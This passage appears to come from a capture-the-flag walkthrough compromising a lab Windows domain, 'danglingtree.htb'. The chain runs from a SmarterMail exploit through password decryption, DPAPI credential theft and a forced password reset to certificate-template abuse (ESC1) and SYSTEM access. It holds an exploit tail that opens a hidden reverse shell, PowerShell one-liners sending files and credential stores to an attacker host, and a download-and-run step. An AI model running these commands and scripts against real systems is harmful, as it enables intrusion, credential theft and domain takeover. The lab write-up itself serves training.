        # Start-Process detaches the shell so the API call returns immediately
        enc = "powershell -nop -w hidden -c \"" + ps.replace(chr(34), chr(92) + chr(34)) + "\""
        cmd = "cmd.exe /c start /b " + enc

    # Mount path doubles as the unique key - use a fresh one each run to avoid clashes
    mount_path = "C:\\Windows\\Temp\\mailmount" + str(int(time.time()))
    print(f"[*] Creating volume mount {mount_path}")
    print(f"[*] Command: {cmd[:100]}...")
    print(f"[*] Start your listener:  nc -lvnp {args.lport}")
    create_mount(base, token, mount_path, cmd)

if __name__ == "__main__":
    main()
```

```bash
nc -lnvp 4445
```

```bash
python3 smartermail_cve-2026-23760.py http://127.0.0.1:17017
```

Gain shell as `svc_mail`

```
whoami
danglingtree\svc_mail
```

`SmarterMail`'s domain documentation specifies `C:\SmarterMail\Domains` as the default domain data directory.
A backup files also exists here.

```powershell
PS C:\SmarterMail\Domains> dir


    Directory: C:\SmarterMail\Domains


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         8/17/2026   7:24 PM                danglingtree.htb                                                     
d-----         3/26/2026   2:19 PM                danglingtree.htb.bak
```

We can see from the Users directory that there is a new user.

```powershell
PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         3/25/2026  10:40 PM                .NET v4.5                                                            
d-----         3/25/2026  10:40 PM                .NET v4.5 Classic                                                    
d-----         3/25/2026  10:19 PM                Administrator                                                        
d-----         8/17/2026   5:08 PM                anderson.w                                                           
d-----         3/26/2026   2:23 PM                noah.b                                                               
d-r---         3/25/2026  10:19 PM                Public                                                               
d-----         3/27/2026   5:53 PM                svc_mail
```

`noah.b` would be our next target.
Let check the backup file

```powershell
PS C:\Users> cd C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b
PS C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b> dir


    Directory: C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         3/26/2026   2:19 PM                FileStore                                                            
d-----         3/26/2026   2:19 PM                Mail                                                                 
-a----         3/26/2026   2:20 PM             13 acquaintances.sbin                                                   
-a----         3/26/2026   2:19 PM           5201 folders.json                                                         
-a----         3/26/2026   2:19 PM           7529 settings.json
```

We found the encrypted password from `noah.b` config file

```
"password_encrypted":"66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby","password_expiration_last_notification":-1,"internet_calendars":[],"password_last_change_utc":"2026-03-26T21:19:49.1311428Z"
```

The service catalog contains a large `SmarterMail` implementation assembly, which we can try to download and then crack its encryption method.

```powershell
PS C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b> Get-Item 'C:\Program Files (x86)\SmarterTools\SmarterMail\Service\SmarterMail.Standard.dll'


    Directory: C:\Program Files (x86)\SmarterTools\SmarterMail\Service


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          1/8/2026   2:27 PM       36341248 SmarterMail.Standard.dll
```

Start receiver from attacker machine

```bash
nc -lnvp 60001 > SmarterMail.Standard.dll
```

Send the file to the receiver from the target machine

```powershell
$path = 'C:\Program Files (x86)\SmarterTools\SmarterMail\Service\SmarterMail.Standard.dll'
$bytes = [IO.File]::ReadAllBytes($path)
$client = New-Object Net.Sockets.TcpClient('<attacker-ip>', 60001)
$stream = $client.GetStream()
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
```

We opened the assembly file using `dnSpy` and searched for the keywords "password" or "`crypto`". `CryptographyHelper` matched.
Test these two password pairs using `PyCryptodome`:

```python
from base64 import b64decode

from Crypto.Cipher import DES
from Crypto.Util.Padding import unpad

ciphertext = b64decode("66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby")

keymaps = {
    "keymap1": (
        bytes([125, 113, 232, 233, 160, 34, 123, 208]),
        bytes([224, 222, 8, 14, 29, 138, 139, 223]),
    ),
    "keymap2": (
        bytes([180, 63, 132, 209, 16, 180, 233, 145]),
        bytes([1, 216, 174, 230, 73, 173, 146, 39]),
    ),
}

for name, (key, iv) in keymaps.items():
    try:
        plaintext = unpad(DES.new(key, DES.MODE_CBC, iv).decrypt(ciphertext), 8)
        print(f"{name}: {plaintext.decode()}")
    except (ValueError, UnicodeDecodeError):
        pass
```

```bash
python3 crack.py
# keymap2: RiverDragon#Storm25
```

Since the target does not have a `WinRM` port open (e.g., 5985), we used Noah's credentials to run `RunasCs` from the `svc_mail` shell.

Get *RunasCs.exe* from attacker machine
```powershell
(New-Object Net.WebClient).DownloadFile('http://<attacker-ip>:8000/RunasCs.exe', 'C:\Windows\Temp\RunasCs.exe')
```

Start another listener
```bash
nc -lnvp 6666
```

Run *RunasCs.exe*
```powershell
C:\Windows\Temp\RunasCs.exe noah.b 'RiverDragon#Storm25' cmd.exe -r <attacker-ip>:6666
```

Got shell as `noah.b`
```
whoami
danglingtree\noah.b
```

### Bloodhound Enumeration
I would prefer use `rusthound-ce`to help us collect the data

Sync time
```bash
sudo ntupdate -u danglingtree.htb
```

Run `rusthound-ce`
```bash
rusthound-ce \
    -d danglingtree.htb \
    -u 'noah.b@danglingtree.htb' \
    -p 'RiverDragon#Storm25' \
    -f DC.danglingtree.htb \
    -i <target-ip> \
    -n <target-ip> \
    --dns-tcp --ldaps \
    -c All \
    -z
```

> [!HINT] Bloodhound
> RustHound-CE enumeration revealed that Noah can register certificates with the enterprise CA through his Domain Users membership—a useful primitive for authentication attacks. However, while an `AddKeyCredentialLink` exists between the Privileged Key Management group and the default Domain Controller `GPO {6AC1786C-016F-11D2-945F-00C04FB984F9}`, Noah lacks write permissions to this policy, ruling out that escalation path. Our focus therefore shifts to abusing Noah's certificate registration rights.

### Switch to alex.o
Now that we have control of noah, let's see if he's stored anything interesting.
Microsoft's `cmdkey` utility will list the currently stored credentials:

```powershell
C:\Users>cmdkey /list
cmdkey /list

Currently stored credentials:

    Target: Domain:target=PC01.danglingtree.htb
    Type: Domain Password
    User: alex.o
```

`alex.o`seems interesting here.Even though he didn't reveal the password, we were still able to find Noah's credentials and master key file.

```powershell
powershell
Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force
Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -Force
```

We found something interesting. We still need to download them to our local machine for cracking.
Let transfer the files to attacker machine:

==Attacker machine==
```bash
nc -lvnp 6001 > f53fcaba-f057-48e8-8f92-0180d274bf0f
nc -lvnp 6002 > 57FFB67D684C67F09E7153B9C7CC3940
```

==Target machine==
```bash
powershell -NoProfile -Command "$p='C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f';$b=[IO.File]::ReadAllBytes($p);$c=[Net.Sockets.TcpClient]::new('<attacker-ip>',6001);$s=$c.GetStream();$s.Write($b,0,$b.Length);$s.Close();$c.Close()"

powershell -NoProfile -Command "$p='C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\57FFB67D684C67F09E7153B9C7CC3940';$b=[IO.File]::ReadAllBytes($p);$c=[Net.Sockets.TcpClient]::new('<attacker-ip>',6002);$s=$c.GetStream();$s.Write($b,0,$b.Length);$s.Close();$c.Close()"
```

We used the domain password from `Impacket`'s `dpapi.py` to `decrypt` the master key:

```bash
impacket-dpapi masterkey \
    -file f53fcaba-f057-48e8-8f92-0180d274bf0f \
    -sid 'S-1-5-21-4220238332-57023728-1129110646-1602' \
    -password 'RiverDragon#Storm25'
```

Provide the key to the credential parser

```bash
impacket-dpapi credential \
    -file 57FFB67D684C67F09E7153B9C7CC3940 \
    -key 0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8
```

Now we can get another credit `alex.o:SunsetMountainPeak@2025`
Come back to Bloodhound, let's check what `alex.o`can do.

> [!HINT] Bloodhound
> `alex.o` member of `Support-IT` can force change password `jake.h`

Now we can try to change the password of `Jake.H`

```bash
bloodyAD -H dc.danglingtree.htb -i 10.129.10.238 \
    -d danglingtree.htb \
    -u alex.o -p 'SunsetMountainPeak@2025' \
    -s set password jake.h 'Admin@123' 
# [+] Password changed successfully!
```

Continue to check what can `Jake.H`do

> [!HINT] Bloodhound
> Analysis of Jake.H reveals a significantly more privileged position than Noah. Beyond standard certificate enrollment rights (EFS, ClientAuth, and User templates), Jake.H is a member of the Template Editors group, granting the ability to modify certificate templates—a powerful primitive that can lead to domain escalation if exploited. Additionally, his membership in DevOps PKI indicates elevated access to Certificate Authority infrastructure, while Remote Management Users and Remote Desktop Users groups provide lateral movement capabilities. These combined privileges make Jake.H a critical target for further exploitation.

`Certipy`'s initial scan extracted CA-level permissions provided by `Helpdesk_Cert_Support`:

```bash
certipy find \         
    -u 'jake.h@danglingtree.htb' \
    -p 'Admin@123' \
    -dc-ip <target-ip> \
    -dc-host dc.danglingtree.htb \
    -stdout | grep -i ManageCertificates
```

The Manage Certificates feature allows for the approval and revocation of certificate requests.

Due to the lack of Manage CA permissions, Jake cannot change the CA configuration or publish a different template name.

The group name alone does not prove the delegated permissions. We need to use bloodyAD to query Jake's valid child object permissions:

```bash
bloodyAD -H dc.danglingtree.htb -i <target-ip> \
    -d danglingtree.htb \
    -u jake.h -p 'Admin@123' \ 
    -s get writable --partition CONFIGURATION --right CHILD --detail
```

```
distinguishedName: CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
device: CREATE_CHILD

distinguishedName: CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
msPKI-Enterprise-Oid: CREATE_CHILD
```

> [!HINT] Permission
> Create a pKICertificateTemplate object under CN=Certificate Templates.
> Create the corresponding msPKI-Enterprise-Oid data under CN=OID.

Directory permissions are limited to these two `PKI` containers. Therefore, we queried the CA's `pKIEnrollmentService` object via `LDAP` and requested its multi-valued `certificateTemplates` property:

```bash
LDAPTLS_REQCERT=never ldapsearch -LLL -x -H ldaps://<target-ip> \
    -D 'jake.h@danglingtree.htb' -w 'Admin@123' \ 
    -b 'CN=danglingtree-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
    -s base '(objectClass=pKIEnrollmentService)' certificateTemplates
```

```
dn: CN=danglingtree-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Ser
 vices,CN=Configuration,DC=danglingtree,DC=htb
certificateTemplates: RemoteAccessVPN
certificateTemplates: EmployeeAuthTemplate
certificateTemplates: VPNUserTemplate
certificateTemplates: DirectoryEmailReplication
certificateTemplates: DomainControllerAuthentication
certificateTemplates: KerberosAuthentication
certificateTemplates: EFSRecovery
certificateTemplates: EFS
certificateTemplates: DomainController
certificateTemplates: WebServer
certificateTemplates: Machine
certificateTemplates: User
certificateTemplates: SubCA
certificateTemplates: Administrator
```

Continued checking each corresponding object under `CN=Certificate Templates`

```bash
for template in RemoteAccessVPN EmployeeAuthTemplate VPNUserTemplate; do
    printf '[%s]\n' "$template"
    LDAPTLS_REQCERT=never ldapsearch -LLL -x -H ldaps://<target-ip> \
        -D 'jake.h@danglingtree.htb' -w 'Admin@123' \ 
        -b "CN=$template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb" \
        -s base '(objectClass=*)' dn 2>/dev/null
done
```

The absence of a identifiable name returned by the query indicates that all three template objects do not exist.

While Jake cannot add new posting entries, he can create the missing objects.

Next, let's create a missing `EmployeeAuthTemplate`.

```python
#!/usr/bin/env python3

import argparse
import secrets
import ssl
import struct

from impacket.ldap import ldaptypes
from ldap3 import ALL, BASE, MODIFY_REPLACE, SUBTREE, Connection, Server, SIMPLE, Tls
from ldap3.protocol.microsoft import security_descriptor_control


CLIENT_AUTH = "1.3.6.1.5.5.7.3.2"


def fail(connection, action):
    raise SystemExit(f"[-] {action}: {connection.result}")


def create_ace(sid, mask):
    ace = ldaptypes.ACE()
    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    ace["AceFlags"] = 0
    ace["Ace"] = ldaptypes.ACCESS_ALLOWED_ACE()
    ace["Ace"]["Mask"] = ldaptypes.ACCESS_MASK()
    ace["Ace"]["Mask"]["Mask"] = mask
    ace["Ace"]["Sid"] = ldaptypes.LDAP_SID()
    ace["Ace"]["Sid"].fromCanonical(sid)
    return ace


def create_security_descriptor(sid):
    descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR()
    descriptor["Revision"] = b"\x01"
    descriptor["Sbz1"] = b"\x00"
    descriptor["Control"] = 0x9C04
    descriptor["OwnerSid"] = ldaptypes.LDAP_SID()
    descriptor["OwnerSid"].fromCanonical(sid)
    descriptor["GroupSid"] = b""
    descriptor["Sacl"] = b""

    descriptor["Dacl"] = ldaptypes.ACL()
    descriptor["Dacl"]["AclRevision"] = 2
    descriptor["Dacl"]["Sbz1"] = 0
    descriptor["Dacl"]["Sbz2"] = 0
    descriptor["Dacl"].aces = [
        create_ace(sid, 983551),
        create_ace("S-1-5-11", 131220),
    ]
    return descriptor


parser = argparse.ArgumentParser(
    description="Create a certificate-template OID and an initial template object over LDAPS"
)
parser.add_argument("-H", "--host", required=True)
parser.add_argument("-u", "--user", required=True)
parser.add_argument("-p", "--password", required=True)
parser.add_argument("-t", "--template", default="EmployeeAuthTemplate")
args = parser.parse_args()

tls = Tls(validate=ssl.CERT_NONE)
server = Server(args.host, port=636, use_ssl=True, tls=tls, get_info=ALL)
connection = Connection(
    server,
    user=args.user,
    password=args.password,
    authentication=SIMPLE,
    auto_bind=True,
    check_names=False,
)

config_dn = server.info.other["configurationNamingContext"][0]
oid_base = f"CN=OID,CN=Public Key Services,CN=Services,{config_dn}"
template_base = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{config_dn}"
template_dn = f"CN={args.template},{template_base}"

connection.search(template_dn, "(objectClass=*)", BASE, attributes=["cn"])
template_exists = bool(connection.entries)

if not template_exists:
    connection.search(oid_base, "(objectClass=*)", BASE, attributes=["msPKI-Cert-Template-OID"])
    root_oid = connection.entries[0]["msPKI-Cert-Template-OID"].value

    connection.search(
        oid_base,
        "(objectClass=msPKI-Enterprise-Oid)",
        SUBTREE,
        attributes=["msPKI-Cert-Template-OID"],
    )
    prefix = f"{root_oid}.1."
    indexes = []
    for entry in connection.entries:
        value = entry["msPKI-Cert-Template-OID"].value
        if value and value.startswith(prefix) and value[len(prefix) :].isdigit():
            indexes.append(int(value[len(prefix) :]))

    index = max(indexes, default=0) + 1
    template_oid = f"{prefix}{index}"
    oid_cn = f"{index}.{secrets.token_hex(16).upper()}"
    oid_dn = f"CN={oid_cn},{oid_base}"

    oid_attributes = {
        "objectClass": ["top", "msPKI-Enterprise-Oid"],
        "cn": oid_cn,
        "displayName": args.template,
        "flags": 1,
        "msPKI-Cert-Template-OID": template_oid,
    }

    if not connection.add(oid_dn, attributes=oid_attributes):
        fail(connection, "OID creation failed")

    template_attributes = {
        "objectClass": ["top", "pKICertificateTemplate"],
        "cn": args.template,
        "displayName": args.template,
        "instanceType": 4,
        "showInAdvancedViewOnly": True,
        "flags": 0,
        "revision": 1,
        "pKIDefaultKeySpec": 2,
        "pKIKeyUsage": b"\x86\x00",
        "pKIMaxIssuingDepth": -1,
        "pKICriticalExtensions": ["2.5.29.19", "2.5.29.15"],
        "pKIExpirationPeriod": struct.pack("<q", -315360000000000),
        "pKIOverlapPeriod": struct.pack("<q", -36288000000000),
        "pKIExtendedKeyUsage": [CLIENT_AUTH],
        "pKIDefaultCSPs": [
            "2,Microsoft Base Cryptographic Provider v1.0",
            "1,Microsoft Enhanced Cryptographic Provider v1.0",
        ],
        "msPKI-RA-Signature": 0,
        "msPKI-Enrollment-Flag": 0,
        "msPKI-Private-Key-Flag": 16,
        "msPKI-Certificate-Name-Flag": 1,
        "msPKI-Minimal-Key-Size": 2048,
        "msPKI-Template-Schema-Version": 1,
        "msPKI-Template-Minor-Revision": 1,
        "msPKI-Cert-Template-OID": template_oid,
    }

    if not connection.add(template_dn, attributes=template_attributes):
        connection.delete(oid_dn)
        fail(connection, "template creation failed")

    print(f"[+] OID:      {template_oid}")
    print(f"[+] OID DN:   {oid_dn}")

descriptor = create_security_descriptor("S-1-5-11").getData()
changes = {"nTSecurityDescriptor": [(MODIFY_REPLACE, [descriptor])]}
control = security_descriptor_control(sdflags=0x04)
if not connection.modify(template_dn, changes, controls=control):
    fail(connection, "DACL update failed")

print(f"[+] Template: {template_dn}")
print("[+] Authenticated Users received full control")

```

```bash
python3 create_template.py \           
    -H dc.danglingtree.htb \
    -u 'jake.h@danglingtree.htb' \
    -p 'Admin@123' \
    -t EmployeeAuthTemplate
```

We use `Certipy` to apply its default `ESC1` configuration to new objects. `Certipy`'s `create_esc1_template` enables client authentication, allows the registrant to provide the principal, disables administrator approval, and does not require authorization signatures:

```bash
certipy template \
    -u 'jake.h@danglingtree.htb' -p 'Admin@123' \ 
    -dc-ip <target-ip> -dc-host dc.danglingtree.htb \
    -template EmployeeAuthTemplate \
    -write-default-configuration S-1-5-11 \
    -no-save -force
```

The new template scan confirmed the ESC1 condition.

```bash
certipy find \     
    -u 'jake.h@danglingtree.htb' -p 'Admin@123' \
    -dc-ip <target-ip> -dc-host dc.danglingtree.htb \
    -vulnerable
```

```
[!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC15                             : Enrollee supplies subject and schema version is 1.
      ESC4                              : Template is owned by user.
```

ESC1 allows Jake to request a client authentication certificate for another principal. We first query the domain SID and append the administrator RID 500:

```bash
rpcclient -U 'DANGLINGTREE/jake.h%Admin@123' dc.danglingtree.htb -c 'lsaquery'
```

Continue requesting a certificate containing the administrator `UPN` and object SID.

```bash
sudo ntpdate -u danglingtree.htb

certipy req \   
    -u 'jake.h@danglingtree.htb' -p 'Admin@123' \ 
    -dc-ip <target-ip> -dc-host dc.danglingtree.htb \
    -ca danglingtree-DC-CA \
    -template EmployeeAuthTemplate \
    -upn 'administrator@danglingtree.htb' \
    -sid 'S-1-5-21-4220238332-57023728-1129110646-500' \
    -dynamic-endpoint \
    -out administrator.pfx
```

Finally, verify the certificate.

```bash
sudo ntpdate -u danglingtree.htb

certipy auth \
    -pfx administrator.pfx \
    -dc-ip <target-ip> \
    -domain danglingtree.htb \
    -username administrator
```

We get `administrator` hash and were able to obtain a shell using `Impacket`'s `psexec.py`.

```
impacket-psexec \ 
    'danglingtree.htb/Administrator@dc.danglingtree.htb' \
    -hashes ':[REDACTED]'
```

```
whoami
nt authority\system
```

## Flags Path

```
C:\Users\noah.b\Desktop\user.txt
C:\Users\Administrator\Desktop\root.txt
```
